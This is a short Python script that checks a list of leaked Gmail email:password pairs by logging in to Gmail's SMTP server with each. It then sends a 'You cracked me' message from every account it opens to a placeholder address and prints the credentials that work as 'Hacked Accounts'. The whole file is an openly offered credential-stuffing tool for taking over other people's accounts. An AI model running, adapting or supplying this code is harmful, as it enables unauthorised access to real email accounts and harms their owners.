import smtplib

with open("gmail.txt", "r") as f:
  gmaileak = f.readlines()

gmaileak = [x.strip() for x in gmaileak]

k = 0
y = 0
v = []
hacked = 0
wrong = 0
while k < len(gmaileak):
  k += 1
  try:
    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    email = gmaileak[k-1][:gmaileak[k-1].find(':')]
    password = gmaileak[k-1][gmaileak[k-1].find(':')+1:]
    v.append(email)
    v.append(password)
    s.login(email, password)

    message = "You cracked me"

    s.sendmail(email, "youremailaddr@gmail.com",
    message)
    if k > len(gmaileak):
      break
  except smtplib.SMTPResponseException as e:
    error_code = e.smtp_code
    error_message = e.smtp_error
    if error_code == 534:
      hacked += 1
      print("Email & Password is true: " + v[len(v)-2] + ":" + v[len(v)-1])
    elif error_code == 535:
      wrong += 1
    else:
      print(error_code)
      print(error_message)
  finally:
    s.quit()

print("Hacked Accounts: " + str(hacked))
print("Wrong Accounts: " + str(wrong))
